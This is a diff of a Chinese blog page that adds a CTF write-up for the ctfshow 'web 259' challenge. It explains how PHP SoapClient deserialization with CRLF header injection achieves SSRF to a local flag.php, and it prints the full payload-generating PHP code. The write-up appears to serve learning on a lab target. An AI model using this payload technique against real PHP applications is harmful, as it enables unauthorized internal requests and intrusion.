@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-11
+                    2022-02-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    189
+                    451
                 </div>
                 
 
@@ -498,7 +498,27 @@ $c = str_replace('O:8','O:+8',$b);
 echo urlencode($c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220211224837338.png" alt="image-20220211224837338"></p>
+<h2 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h2><p>要想得到flag，必须本地访问flag.php而且带上token=ctfshow，一看到是根据x-forwarded-for来判断的，第一反应是直接改xff头，但是这题不行,y4师傅说是因为有了cloudfare代理，我们无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p>
+<p>前言:如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p>
+<p>前置知识 CRLF[文章](<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p>
+<p>大佬博客 <a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a> Y4tacker</p>
+<p>最终payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$target = 'http://127.0.0.1/flag.php';
+$post_string = 'token=ctfshow';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1,127.0.0.1',
+);
+$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'D4marvel^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; "aaab"));
 
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\r\n",$aaa);
+$aaa = str_replace('&amp;','&amp;',$aaa);
+echo urlencode($aaa);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220213113033981.png" alt="image-20220213113033981"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
                 
             </div>
             <hr/>
@@ -1023,7 +1043,7 @@ echo urlencode($c);<span aria-hidden="true" class="line-numbers-rows"><span></sp
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">11.6k</span>
+                        class="white-color">12.6k</span>
             
             
             
